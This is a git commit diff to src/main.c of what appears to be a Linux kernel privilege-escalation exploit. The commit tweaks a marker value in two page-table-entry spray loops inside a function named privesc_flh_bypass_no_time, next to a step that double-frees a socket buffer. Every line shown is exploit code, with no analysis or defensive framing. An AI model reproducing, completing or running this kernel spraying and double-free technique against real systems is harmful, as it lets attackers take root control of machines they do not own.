6ba1207f5d3dcb023bd52f89de84f78eb298c90b
Willenst <willenst@gmail.com>
2024-11-11 14:18:50 +0200

    test 1

--- src/main.c
+++ src/main.c
@@ -282,7 +282,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// pre-allocate PMDs for sprayed PTEs
 	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
-		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = (0x41 << 16) | i; 
+		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x410000+i;
 	
 	// these use different PTEs but the same PMD
 	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -329,7 +329,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = (0x41 << 16) | i; 
+		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x410000+i;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
